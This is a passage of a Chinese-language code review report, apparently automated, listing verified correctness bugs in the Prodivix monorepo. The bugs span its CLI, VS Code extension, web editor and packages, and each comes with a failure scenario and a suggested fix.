**验证备注**: cli.ts:17 守卫属实;package.json dev=tsx src/cli,根 dev:cli 经 turbo 走此路径,cli() 唯一 dev 入口。本机实测 tsx:argv[1]=C 盘反斜杠无导斜杠,meta=file:///C:/,guard=false;tsx src/cli build 无输出、退出码 0,静默空转。POSIX 侥幸匹配。

##### M-C-04 esbuild 入口为脚手架 extension.ts,未注册 package.json 贡献的 previewPIR 命令

- **位置**: [`apps/vscode/esbuild.js:30`](apps/vscode/esbuild.js#L30)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: apps-cli-vscode

**详情**: esbuild.js 第30行 entryPoints 为 src/extension.ts,该文件是 yo-code 脚手架样板,只注册 prodivix.helloWorld(且 package.json contributes.commands 中已无此命令,属死代码);真正注册 prodivix.previewPIR 的逻辑在 src/index.ts 第11行。两者是同一扩展的两个互斥入口,而 main 指向 out/index.js(见独立发现),dist/extension.js 的产物与 contributes 完全脱节。

**失败场景**: 若按 main 修复方案把入口指向 dist/extension.js,激活后只注册 helloWorld;用户执行命令面板贡献的 PIR: Preview PIR,报 command prodivix.previewPIR not found。

**修复建议**: entryPoints 改为 src/index.ts(并把 registerCommand 的 disposable push 进 context.subscriptions),删除不再使用的 src/extension.ts 脚手架。

**验证备注**: esbuild.js:30 入口 src/extension.ts 到 dist/extension.js;该文件 activate 仅 registerCommand prodivix.helloWorld(L16)且未 import index.ts。package.json contributes 仅 prodivix.previewPIR(L31)、main 为 out/index.js(L14);全仓 grep 证实 previewPIR 唯一注册点在 index.ts:11。

##### M-C-05 调试器 program 指向扩展根目录之外,且适配器为立即退出的空实现

- **位置**: [`apps/vscode/package.json:39`](apps/vscode/package.json#L39)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: apps-cli-vscode

**详情**: contributes.debuggers[0].program(package.json:39)指向扩展根之外,打包 VSIX 后路径必失效;即便 monorepo 开发环境可解析,该文件(debugAdapter.ts:1)仅导出空函数 startDebugAdapter 并经 require.main 守卫执行,无任何 DAP 握手,node 立即退出。且 index.ts 中 DebugAdapterDescriptorFactory 注册被注释,无覆盖。属有意为之的未完成桩,非偶发缺陷。

**失败场景**: 打包扩展中启动 Pdx Debug 会话,路径解析到安装目录之外,报 Cannot find debug adapter;即使在 monorepo 开发环境路径可解析,VS Code 以 node 启动该模块后进程立即退出、不输出任何 DAP initialize 响应,会话直接报 Debug adapter process has terminated unexpectedly。

**修复建议**: 将调试适配器随扩展一起打包(经 node_modules/@prodivix/vscode-debugger 引用或复制到扩展内),并用 @vscode/debugadapter 实现 LoggingDebugSession 完成 initialize/launch 握手后再贡献 debugger。

**验证备注**: package.json:39 program 为 ../../packages/vscode-debugger/lib/debugAdapter.js,越出扩展根目录。debugAdapter.ts:1 startDebugAdapter 为空函数,3-5 行 require.main 守卫调用空函数,无 DAP/DebugSession.run,node 事件循环空即退出。index.ts:15-17 的注册被注释。

##### M-C-06 pir 语言 configuration 路径指向不存在的 ./language/,配置必然缺失

- **位置**: [`apps/vscode/package.json:26`](apps/vscode/package.json#L26)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: apps-cli-vscode

**详情**: contributes.languages 第26行 configuration 为 ./language/pir.language-configuration.json,但仓库内该文件实际位于 src/language/pir.language-configuration.json(git ls-files 确认根目录无 language/ 目录);且 .vscodeignore 第5行排除 src/**,即使路径修正为 ./src/... 也不会进入 VSIX。

**失败场景**: VS Code 加载语言贡献时按扩展根目录解析 ./language/...,文件不存在,输出 Cannot find language configuration file 警告,.pir.json 文件失去注释切换、括号匹配与自动闭合配置;打包 VSIX 后该缺失同样成立。

**修复建议**: 将路径改为 ./src/language/pir.language-configuration.json 并在 .vscodeignore 中用 !src/language/** 显式保留,或将配置文件移动到扩展根目录下再引用。

**验证备注**: package.json L26 引用 ./language/pir.language-configuration.json,但 ls/git ls-files 证实扩展根目录无 language/,实际文件在 src/language/;esbuild.js 仅 bundle src/extension.ts 到 dist,无任何拷贝步骤;.vscodeignore L5 排除 src/**。VS Code 按扩展根解析该路径必然失败。

##### M-C-07 handleClone 投影未就绪分支提前 return 未复位 isCloning,克隆按钮永久锁死

- **位置**: [`apps/web/src/community/CommunityDetailPage.tsx:122`](apps/web/src/community/CommunityDetailPage.tsx#L122)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-app-shell

**详情**: handleClone 在第 115 行先执行 setCloning(true); setCloneError(null),随后第 117-123 行 if (publishedPir?.status !== ready) 时 setCloneError 并 return。该 return(第 122 行)位于第 126 行 try 块之外,因此第 155-157 行的 finally setCloning(false) 不会覆盖这条路径,isCloning 将永远保持 true。而克隆按钮 disabled={isCloning}(第 241 行)且文案随 isCloning 变为 Cloning...。此分支真实可达:createPublishedPirProjection 在 PIR 解码失败或投影被阻断时会返回 status:blocked。

**失败场景**: 用户打开一个公开项目,其 pir 字段为旧版/损坏快照导致 decodePirDocument 失败(publishedPir.status===blocked,预览区已显示 issue),用户点击 Clone to My Workspace,cloneError 正常显示,但 isCloning 停在 true,按钮永久显示 Cloning... 且 disabled,不刷新页面/重新路由就再也无法重试克隆。

**修复建议**: 在该分支 return 之前补 setCloning(false);或将就绪检查移到 setCloning(true) 之前;或用 try/finally 包裹整个函数体(setCloning(true) 放 try 首行),保证所有出口都复位。

**验证备注**: handleClone 第115行 setCloning(true) 后,第117-122行 status 非 ready 分支的 return 位于第126行 try 之外,故第155-157行 finally 的 setCloning(false) 不覆盖该路径;文件内 setCloning(false) 仅此一处。第241行按钮 disabled={isCloning}。

##### M-C-08 跨时间轴点击轨道/关键帧时播放头被旧活动时长错误钳制

- **位置**: [`apps/web/src/editor/features/animation/panels/AnimationEditorTimelinePanel.tsx:180`](apps/web/src/editor/features/animation/panels/AnimationEditorTimelinePanel.tsx#L180)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-anim-conflict

**详情**: onPointerDown(173-185) 先 onCursorChange(nextMs)(180) 再 onSelectTimeline(181); 关键帧按钮同样先 onCursorChange(keyframe.atMs)(212) 再 onSelectTimeline(213)。changeCursor 到 setCursorMs(useAnimationEditorState.ts:583-592) 用闭包里的 activeTimeline 钳制: clampMs(value, activeTimeline.durationMs)(587)。三个 setState 在同一事件批处理, setCursorMs 看到的仍是切换前的活动时间轴; 随后光标 effect(571-577) 只做 clamp(1000, 5000)=1000, 无法纠正。

**失败场景**: Timeline A(活动, 1000ms) 与 B(5000ms)。点击 B 轨道 3000ms 处或 B 上 3500ms 的关键帧, nextMs 先被 A 的 1000 钳成 1000, 之后活动切到 B。结果活动 timeline 为 B 但播放头停在 1000ms 而非点击位置, 预览求值帧与用户预期不符。

**修复建议**: 在 TimelinePanel 中先 onSelectTimeline/onSelectTrack 再 onCursorChange; 或让 onCursorChange 接收目标行的 durationMs 并据此钳制(如 changeCursor(nextMs, row.durationMs)), 不依赖闭包中过期的 activeTimeline。

**验证备注**: 已核实:Panel onPointerDown(173-185)先 onCursorChange(180)后 onSelectTimeline(181),关键帧同(212-213);Content 接线 changeCursor 到 setCursorMs。setCursorMs(583-592,deps activeTimeline)按闭包旧 activeTimeline.durationMs 钳制(587)。React 19.2.7 同事件批量更新,闭包见旧 A。

##### M-C-09 惯性平移不因外部 pan 变更停止,Reset View 后视图继续漂移

- **位置**: [`apps/web/src/editor/features/blueprint/editor/canvas/BlueprintEditorCanvas.tsx:144`](apps/web/src/editor/features/blueprint/editor/canvas/BlueprintEditorCanvas.tsx#L144)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-canvas

**详情**: 结论成立,但一处机制描述不准:Reset 按钮位于 ViewportBar,不是 canvas surface 的子元素,点击它根本不会触发 surface 的 handlePointerDown;真正原因是 143-145 行 pan 同步 effect 不调用 stopInertia,rAF 循环下一帧即以 panRef.current(已是80,60)加残余速度 applyPan 并经 onPanChange 到 setBlueprintState 覆盖复位后的 pan。

**失败场景**: 快速轻扫画布触发惯性,约 1 秒内点击 Reset View,pan 被重置为 80,60,但惯性循环下一帧即 applyPan(80,60 加残余速度),视图沿轻扫方向继续滑行约 100-400px,复位结果被覆盖,用户看到复位失效。

**修复建议**: 在 143-145 行 pan 同步 effect 中检测非本组件发起的 pan 变更并调用 stopInertia();或让惯性循环记录启动代际,外部 pan 写入时使其失效。

**验证备注**: 属实。299-311 行 step 循环 applyPan(panRef.current+v) 至速度小于0.1;stopInertia 仅见于 wheel(202)、pointerdown(243)、Ctrl 加减(347)与卸载清理。143-145 行 effect 对外部 pan 变更仅写 panRef.current,不取消循环。controller 1094-1100 onResetView 经 setBlueprintState 设 pan=80,60。

##### M-C-10 literal 源草稿同步 effect 在每次有效击键提交后重排文本并打断输入

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/CollectionInspectorPanel.tsx:198`](apps/web/src/editor/features/blueprint/editor/inspector/CollectionInspectorPanel.tsx#L198)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-insp-c

**详情**: 描述基本准确;补充:回写是经乐观 apply 的异步覆盖(在 outbox enqueue 之后),因此还会丢弃提交后、回写前用户继续键入的未提交字符;且该缺陷使多位数字(如 [12])无法逐键输入。数据本身不损坏,属输入可用性缺陷。

**失败场景**: Literal 源模式下输入 [1,2]:键入 ] 后文本合法并提交,事务应用后模型回填为带换行缩进的格式化文本,textarea 内容与光标位置突然跳变;用户紧接着想补成 [1,2,[3]] 时会在错误位置继续输入,编辑体验被破坏,甚至产生非预期的中间数据提交。

**修复建议**: 仅在语义变化且非用户编辑态时同步草稿:如用 ref 记录焦点/编辑中状态,focus 期间不用模型文本覆盖 draft;或改为失焦/显式 Apply 时提交,避免逐键提交引发的草稿回写。

**验证备注**: changeLiteralSource(L320-336)每次 onChange 对合法 JSON 数组立即 onSourceChange;经 updateCollection 到 applyTransaction 到 dispatchWorkspaceTransaction(workspaceVfsOutboxExecutor L61-64)乐观更新 store,Inspector 的 collectionProjection(L141-147)随 workspace 重算。

##### M-C-11 编辑非 px 单位值为负数或不完整草稿时单位被静默重置为 px

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/components/UnitInput.tsx:302`](apps/web/src/editor/features/blueprint/editor/inspector/components/UnitInput.tsx#L302)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-insp-a

**详情**: amount 输入框 onChange 中,当 sanitized 不是完整数字时执行 onChange(sanitized)(第302行),把不带单位的字符串(如 - 或 .)直接写回父级。parseValue(第171-177行)对无单位字符串一律返回 unit=px,随后第222-225行的 effect setDraftUnit(parsed.unit) 会把 draftUnit 从原单位(如 rem/%)重置为 px。于是原单位在编辑过程中被丢弃。

**失败场景**: 当前值为 10rem,用户全选后输入负号 -:onChange(-) 使父值变为 -,parseValue 得 unit=px,effect 把界面上的单位徽章从 rem 改成 px;接着输入 5,此时 draftUnit 已是 px,toOutput(-5,px) 返回数字 -5。最终 10rem 被写成 -5(px),rem 单位丢失、样式被破坏。同理清空后重输也会丢单位。

**修复建议**: 不完整数字草稿只保留在本地 draft、不要写回父级;或写回时保留当前 draftUnit/原始单位。parseValue 对不完整数字应沿用上一次单位而非默认 px。

**验证备注**: 属实可达。第302行 onChange(sanitized) 把 - 写回父级;parseValue 对 - 两正则(171/174)均不匹配,落到177行返回 unit=px;effect(222-225)无编辑中守卫,直接 setDraftUnit(px) 覆盖 rem。随后输 5 时 toOutput(-5,px) 于186行返回数字 -5,rem 丢失。

##### M-C-12 内置 message/notification/progress 的 statusOptions 在调色板描述符往返中丢失

- **位置**: [`apps/web/src/editor/features/blueprint/palette/descriptor.ts:47`](apps/web/src/editor/features/blueprint/palette/descriptor.ts#L47)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-data

**详情**: toPresentation 仅在 item.statusProp 且 item.statusLabel 且 item.statusOptions 有长度 三者齐备时才输出 status 块(第47行)。内置目录项 FeedbackGroup.tsx 的 message(117-130)、notification(146-158)与 DataGroup.tsx 的 progress(131-149)都定义了 statusOptions、defaultStatus 和按 status 渲染的 renderPreview,但从未设置 statusProp/statusLabel(全仓 grep 确认只有 plugin-mui/plugin-antd 设置)。nativeCorePlugin.ts:21 用 createPaletteContributionDescriptor(COMPONENT_GROUPS) 生成核心描述符,经 projectionResolver.resolveItem 重建条目时 statusProp/statusOptions/defaultStatus 只来源于 descriptor.presentation.status(207-212行),不会从运行时投影 COMPONENT_GROUPS 恢复。

**失败场景**: 编辑器加载核心插件调色板后,组件库中 Message、Notification、Progress 三张卡片的 Info/Success/Warning/Danger 状态切换圆点、悬停状态轮播预览全部消失(SidebarComponentList.tsx:102 statusCount=0),renderPreview 的 status 参数永远为 undefined;而目录原本为这些组件设计了按状态切换的预览。

**修复建议**: 为这三个内置项补齐 statusProp/statusLabel(message、notification 用 type/Type,progress 用 status/Status),使描述符能携带 status;这样同时让 applySelectionProps(paletteCreation.ts:162)在插入时按所选状态写入对应 prop。

**验证备注**: 已读:descriptor.ts:47 须 statusProp 且 statusLabel 且 statusOptions 才出 status 块;FeedbackGroup message/notification、DataGroup progress 有 statusOptions/defaultStatus/renderPreview 但无 statusProp(grep 仅 plugin-antd/mui 设置)。nativeCorePlugin.ts:21 生成核心 descriptor。

##### M-C-13 每次成功持久化的回显都整体重建画布节点,清空 selected/dragging 等瞬态状态

- **位置**: [`apps/web/src/editor/features/development/reactflow/NodeGraphEditorContent.tsx:280`](apps/web/src/editor/features/development/reactflow/NodeGraphEditorContent.tsx#L280)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: web-dev-a

**详情**: 提交后 workspace 乐观更新使 activeContentSignature 变化,hydration effect(第268-289行)发现签名不一致即执行 setNodes(toNodeGraphCanvasNodes(activeContent, preservePositions))。toNodeGraphCanvasNodes/nodeGraphStableNode.ts 的 toStableGraphNode 只还原 position/parentId/extent/zIndex/collapsed,不保留 React Flow 瞬态字段(selected、dragging)。任何真实编辑必然改变内容签名(如拖拽改变 position),因此每次持久化回显都把 nodes 整体替换为无 selected 的新对象。该 effect 也无 isDraggingNode 守卫(commit effect 有),外部修订到达会中途打断拖拽。

**失败场景**: 用户拖拽节点松手,提交,一次 dispatch 往返后回显重建画布,节点 selected 被清除、选中环消失,此时按 Delete 删不到刚拖动的节点;多选 3 个节点后编辑其中一个,3 个全部失去选中。另一标签页提交修订时,本标签页正在拖拽的节点被持久化位置覆盖。

**修复建议**: hydration 前先比较 serializeDocument(toCanonicalNodeGraphDocument(nodes, edges)) 与 activeContentSignature,语义相等则跳过重置;必须重置时按 id 从现有 nodes 保留 selected/dragging 等瞬态字段,并在 isDraggingNode 为 true 时延迟回显。

##### M-C-14 图名输入框按 Escape 取消改名时反而会提交改名

- **位置**: [`apps/web/src/editor/features/development/reactflow/NodeGraphGraphManager.tsx:84`](apps/web/src/editor/features/development/reactflow/NodeGraphGraphManager.tsx#L84)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-dev-a

**详情**: onKeyDown 的 Escape 分支执行 setDraftName(activeGraphName); event.currentTarget.blur()(第84-87行)。setDraftName 是异步更新,而 blur 同步触发 onBlur 即 commitRename(第44-48行),此时闭包中的 draftName 仍是用户输入的文本;nextName = draftName.trim() 或 activeGraphName 得到用户文本且 nextName 不等于 activeGraphName,于是调用 onRenameGraph(nextName)。commitRename 内的 setDraftName(nextName) 还会覆盖 Escape 的还原。Escape 行为实际等价于 Enter。

**失败场景**: 图名为 Flow 1,用户在名称框输入 Wrong 后按 Escape 想取消,blur 同步触发 commitRename,读到旧闭包 draftName=Wrong,下发 VFS 改名命令,图被真实改名为 Wrong,用户显式取消的操作被提交。

**修复建议**: 用 ref 记录取消态:Escape 时先置 cancelRef.current = true,再 setDraftName(activeGraphName) 并 blur;commitRename 开头若 cancelRef.current 为 true 则复位并直接 return。或 Escape 时只还原草稿、不触发 blur。

**验证备注**: 已读 NodeGraphGraphManager.tsx:84-87 Escape 先 setDraftName(activeGraphName) 再同步 blur();onBlur=commitRename(44-48)读闭包 draftName。React18 批处理不会在 keydown 内同步重渲染,blur 同任务同步触发 commitRename 时 draftName 仍是用户输入。

##### M-C-15 importLocale 未校验 JSON 结构,扁平 i18n 文件会把字符串拆成逐字符垃圾键并整库覆盖

- **位置**: [`apps/web/src/editor/features/resources/I18nResourcePage.tsx:415`](apps/web/src/editor/features/resources/I18nResourcePage.tsx#L415)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-resources

**详情**: importLocale 将 JSON.parse 结果直接 as Record 后执行 Object.entries(parsed).map,未校验 values 是否为对象。当值是字符串时 Object.entries(Save) 产出 0 到 S、1 到 a 的逐字符条目;当 parsed 为数组时产出数字命名空间。随后 updateI18nResourceValue 以该结构整体替换 selection.targetLocale(414 行,非合并)并持久化进 workspace,既写入垃圾数据又清掉该 locale 原有全部翻译。catch 仅吞掉 JSON 解析错误,形状错误畅通无阻。

**失败场景**: 用户导入常见的扁平格式 zh-CN.json 含 save 保存、appName Prodivix:store 中 zh-CN 变成命名空间 save(键 0/1 对应保/存)与 appName(逐字符),原有 zh-CN 翻译全部被删并持久化,表格展示大量单字符垃圾键。

**修复建议**: 导入前校验 parsed 为对象且每个 namespace 值也是纯字符串映射(否则报错提示期望嵌套格式,或自动识别扁平格式归入选定命名空间),并考虑与现有 locale 合并而非整体替换。

**验证备注**: importLocale(406-430)对 JSON.parse 结果仅 as 转型(409),无运行时校验;扁平文件值保存经 Object.entries 产出 0 到保、1 到存,420行 typeof string 判断原样保留,生成逐字符键。414-424行以 targetLocale 整体替换,未像 updateLocaleValue(286-287)那样展开原 locale,故清掉原翻译。

##### M-C-16 Alt+字符快捷键在 macOS 上全部失效(matchShortcut 用 event.key 未处理 Option 变字符)

- **位置**: [`apps/web/src/editor/shortcuts/matchShortcut.ts:72`](apps/web/src/editor/shortcuts/matchShortcut.ts#L72)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-editor-core

**详情**: matchShortcut 将 normalizeEventKey(event)(即 event.key.trim().toLowerCase())与 shortcut.key 比较。Editor.tsx 注册了 Alt+1 到 Alt+9、Alt+0、Alt+C 共 11 个面板导航快捷键,EditorBar.tsx(116/141) 还以 title 明示 Alt+C/Alt+0。但在 macOS 上 Option+字符会改变 event.key:Option+C 得 ç、Option+1 得 ¡、Option+0 得 º,normalizeEventKey 得到的是 ç 而非 c,匹配恒为 false。isApplePlatform 只用于把 mod 映射到 meta,没有处理 Alt 组合键的字符重映射,也没有回退到 event.code。

**失败场景**: macOS 用户在编辑器中按 Option+1 / Option+C 想切换面板:event.key 为 ¡/ç,与解析出的 1/c 不等,11 个 Alt 导航快捷键全部静默无响应;Windows/Linux 正常。同一份代码在 macOS 上 advertised 的快捷键完全不可用。

**修复建议**: 当 shortcut.alt 为真且 key 为字母/数字时改用 event.code(如 KeyC、Digit1)匹配,或在 matchShortcut 中对 alt 组合键提供 code 回退映射。

**验证备注**: matchShortcut.ts:72 用 event.key.trim().toLowerCase() 与 shortcut.key 比较,无 event.code 回退;isApplePlatform(27-30)仅映射 mod 到 meta。Editor.tsx:45-153 注册 Alt+1..9/0/C 共11键。macOS Option 使 event.key 变 ¡/ç/º,不等于 1/c。

##### M-C-17 本地项目 Outbox 物化依赖 UUID 平局排序,同毫秒操作会永久毒化因果链

- **位置**: [`apps/web/src/editor/workspaceSync/localProjectWorkspaceOutbox.ts:66`](apps/web/src/editor/workspaceSync/localProjectWorkspaceOutbox.ts#L66)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-sync-store

**详情**: 最易触发的不是 50% 平局:两个 dispatch 在首个 enqueue 的 IDB 事务窗口内重叠时二者都记 base=S,因 applyWorkspaceCommand 不校验 base 版本均被乐观应用,之后无论 UUID 排序如何物化必抛(或 A 先提交时抛 L81 diverged),近 100% 毒化;50% 平局仅属 B 已捕获 S+A 且同毫秒的子情形。当前无 fire-and-forget 批量调用点,重叠仅来自近乎同时的两个 UI 动作,窗口窄但后果永久,须手动清 IndexedDB。

**失败场景**: 本地项目中以 fire-and-forget 方式连续派发两个 Command(同一毫秒 enqueue):commit#1 的 list 恰好读到 A,B 两条同 createdAt 记录,UUID 平局使 B 排前,物化抛 does not continue the durable causal chain,entry 永不被删,之后所有本地提交失败,重新打开项目显示加载错误,未持久化的编辑丢失。

**修复建议**: 物化时不要信任比较器的平局结果:按 baseSnapshot 链做拓扑选择(每轮挑选 baseSnapshot 与当前快照 authoring 相等的 entry),或在 enqueue 时为每个 workspace 分配单调递增的逻辑序号并以其作为排序/校验依据。

**验证备注**: 核实:workspaceOutbox.ts L124-130 排序键 createdAt 到 causalOrderId 到 id,L196-198 id=causalOrderId=randomUUID;localProjectWorkspaceOutbox.ts L95-97 排序、L64-70 base 链校验失败即抛、L123 删除被跳过;dispatcher 仅 console.warn,Editor.tsx L234-268 resume 抛错 setLoadError 无清理。

##### M-C-18 svg-filter-attr 轨道规范化后 filterId 与 primitiveId 跨滤镜不一致

- **位置**: [`packages/animation/src/animationCodec.ts:388`](packages/animation/src/animationCodec.ts#L388)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ng-anim

**详情**: 跨滤镜不一致只在源 primitiveId 缺失时经 389-391 行回退显现;原失败场景中 primitiveId:p1 为显式提供(非回退),核心缺陷仍是悬空 filterId 未修正、canonical 校验幂等放行、求值产出 url(#deleted) 且 attr 编辑被 buildFrame 静默丢弃。

**失败场景**: 规范化文档 svgFilters 含 f1 primitives 含 p1,加 track kind svg-filter-attr filterId deleted primitiveId p1,evaluateAnimationFrame 把 attr 编辑存到 deleted 键下(buildFrame 只遍历真实滤镜,编辑被静默丢弃),同时 style.filter=url(#deleted) 悬空引用,浏览器按 CSS filter 规范不渲染目标节点,动画无效且目标节点消失。

**修复建议**: 规范化时将 filterId 修正为已解析的 filter?.id 或 filterId(与 primitiveId 的回退来源保持一致),或在 filterId 无法解析时统一回退到 defaults 的 filterId/primitiveId 对;亦可让 validator 拒绝悬空 filterId。

**验证备注**: 实测复现成立:normalizeTrack 第382/388行把悬空 filterId=deleted 原样写入,filter(384行)却回退 svgFilters[0],primitiveId 取自它。validateAnimationDefinition(85-109行)仅做 canonicalValuesEqual,幂等故实测 valid:true;reconcileSvgTrackReferences(87-100行)实测判损坏并修为 f1/p1。

##### M-C-19 Git 投影排序使用 localeCompare,manifest/files 字节序随运行环境 locale 变化

- **位置**: [`packages/assets/src/binaryAssetGitProjection.ts:377`](packages/assets/src/binaryAssetGitProjection.ts#L377)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-shared-assets

**详情**: 结论成立但细节需修正:真正随 locale 变化并影响 commit 字节的是 manifest.assets 顺序 JSON 与 .gitattributes 的 lfsPaths 区内容(均源自 orderedSources);files 数组顺序本身不影响 git tree 哈希(git 按文件名字节序自排);444 行 OID 为纯 ASCII hex、378 行 assetDocumentId 受 IDENTITY_PATTERN 限 ASCII,实际 locale 无关;sortDiagnostics 仅影响 blocked 诊断展示顺序。修复仍应统一改码点序。

**失败场景**: 含 /北京/a.png 与 /安徽/b.png 两个资产的同一 workspaceRevision,在 LANG=en_US 的 CI 上投影得到 manifest 顺序 北,安;在 LANG=zh_CN 的开发者机器(或升级 Node/ICU 后)重投影得到 安,北,manifest 字节不同,相同 revision 生成不同 commit SHA,幂等重投影产生重复提交/churn,违反强幂等 Atomic Commit 契约。

**修复建议**: 将全部比较器改为确定性码点序:const cmp = (a, b) 用 a 小于 b 返回 -1、a 大于 b 返回 1、否则 0,替换 377、378、442、444、130-135 行的 localeCompare(同包 normalizeBinaryAssetMediaType 已用 toLocaleLowerCase(en-US) 固定 locale,排序亦应同样固定或改用码点序)。

**验证备注**: 实读 375-379 行 orderedSources 用无固定 locale 的 gitPath.localeCompare 排序,387-401 行按此序生成 manifestEntries,189 行 JSON.stringify 定字节;normalizeGitPath(71-99)与 workspace isCanonicalWorkspaceDocumentPath(45-63)均不禁 CJK。

##### M-C-20 normalizeGitPath 未拦截 Windows 非法/保留路径,ready 投影在 Windows 无法 checkout

- **位置**: [`packages/assets/src/binaryAssetGitProjection.ts:84`](packages/assets/src/binaryAssetGitProjection.ts#L84)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-shared-assets

**详情**: 核心属实但两处细节不准:1) 77行正则还拒 DEL;2) 尾空格段全部放行不完全对——末段尾空格被74行整体 trim 检查拦截,但尾点段(如 /a/file.)、内部尾空格段(/a/CON /x)、Windows 保留名(含扩展名形式 CON.txt)及 小于大于冒号引号竖线问号星号 字符均放行并输出 status ready,经 isomorphic-git 提交后 Windows clone 报 invalid path。上游 @prodivix/workspace 与后端 VFS 校验同规则均不拦。

**失败场景**: 用户创作资产路径 /docs/CON 或 /img/photo:2.png,投影返回 ready 并被适配器提交,任何 Windows 用户 git clone 该投影仓库立即报 error: invalid path docs/CON 整体失败;本仓库同时交付 VS Code 扩展,Windows 开发者必然中招。

**修复建议**: 段级检查增加:大小写不敏感匹配 con/prn/aux/nul/com1-9/lpt1-9 含扩展名形式 与段尾点/空格 拒绝;77 行字符拒绝正则追加 冒号、小于、大于、引号、竖线、问号、星号;违规时产出 AST-1204 诊断。

**验证备注**: 已读源码证实可达:normalizeGitPath(71-99行)77行正则仅拒控制字符/DEL/反斜杠,84行段检查仅拒空/./..,89-97行保留检查仅匹配 .gitattributes/.prodivix/assets.json/.git,故 /docs/CON、/img/photo:2.png、尾点段通过,368行无诊断,453行返回 ready。上游 isCanonicalWorkspaceDocumentPath 与后端 vfs_tree.go:105 同规则不拦。

##### M-C-21 shader 重命名安全检查只查同作用域,遮蔽(shadowing)冲突未被拦截

- **位置**: [`packages/code-language/src/shader/shaderCodeLanguageProvider.ts:186`](packages/code-language/src/shader/shaderCodeLanguageProvider.ts#L186)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-code-language

**详情**: isSafeRenameName 的冲突检测为 candidate.scopeId === symbol.scopeId 且 candidate.name === newName,只比较与被改名符号同作用域的同名符号。GLSL/WGSL 允许内层块/函数体用 var/let 声明与模块级同名的局部变量并遮蔽外层。把模块级符号改名为某个内层作用域已存在的名字(或把局部符号改成模块级名字)时,该检查通过,getRenameEdits 仅改写被改名符号自身的 occurrences,但改名后原本绑定到另一符号的标识符会被词法作用域重新绑定,产生无声语义变更,且不会有任何诊断。

**失败场景**: WGSL: 模块级 var counter f32 与 fn f 内 var helper f32 加 return counter。用户对模块级 counter 执行 F2 重命名为 helper:同作用域(root)无同名符号,检查通过,提案把 return counter 改为 return helper,该引用从此绑定到函数内的局部 helper,行为静默改变;Transaction 校验无法发现这种模块内重绑定。

**修复建议**: 冲突检测应跨越作用域:若 newName 与该 artifact 中任意符号同名,且其作用域范围与被改名符号的任一 occurrence 所在作用域存在嵌套/重叠关系(即改名后会形成遮蔽),则拒绝;或对改名后的源码重跑作用域解析做影响面校验后再产出提案。

**验证备注**: isSafeRenameName(L186-190)仅查 candidate.scopeId===symbol.scopeId 同名;wgsl 分析器中模块 var 为 wgsl-scope:root、函数内 var 为 wgsl-scope:block,跨域同名不拦;occurrence 绑定按最深 scope 解析(L470-477),改名后 return 标识符重绑到局部 helper。

##### M-C-22 reimport 合并整体保留 existing.configurationByKey,已失效的受管 resultPath 被滞留

- **位置**: [`packages/data-graphql/src/dataGraphqlImporter.ts:1080`](packages/data-graphql/src/dataGraphqlImporter.ts#L1080)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-data-conn

**详情**: 合并逻辑为 configurationByKey 展开 existing 与 desired(1079-1081行)。而 resultPath 仅在单顶层字段时生成(compileProjection 643-649行 singleField 才有 resultPath)。当上游 operation 从单顶层字段变为多顶层字段时,desired 不再携带 resultPath,展开合并却保留了 existing 的旧 /user。对比 dataOpenApiImporter.ts mergeOperation(1499-1514行)会先过滤受管键,此处缺失该过滤。滞留键也不在新 provenance digest 内,下次 reimport 的 localDigest 与之不等,产生虚假本地已编辑/冲突。

**失败场景**: 首次导入 query Q 取 user 的 id(resultPath /user,digest D0)并采纳;上游改为 query Q 取 viewer 的 id 加 notifications 的 id 后 reimport:本地未改,更新分支保留旧 resultPath /user,运行时 readPointer(data,/user) 未解析,每次调用抛 DATA_GRAPHQL_RESPONSE_INVALID;若响应仍含 user 则静默返回错误子树,且 output schema 已按新形状更新造成值/模式不一致。

**修复建议**: 与 OpenAPI 的 mergeOperation 对齐:合并前从 existing.configurationByKey 中仅保留非受管键(按 operationDigest 的受管键清单过滤),受管键一律以 desired 为准。

**验证备注**: 已读:587行 singleField 仅单顶层字段生成 resultPath(643-649);1076-1084 无本地编辑分支直接 existing 与 desired 合并,desired 多字段时无 resultPath,旧 /user 滞留;对比 dataOpenApiImporter mergeOperation(1499-1514)按 managedOperationConfigurationKeys 过滤受管键,此处缺失。

##### M-C-23 以内部 defs 前缀开头的 $ref 原样放行,可产出悬空引用且零 import issue

- **位置**: [`packages/data-http/src/dataOpenApiImporter.ts:485`](packages/data-http/src/dataOpenApiImporter.ts#L485)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-data-conn

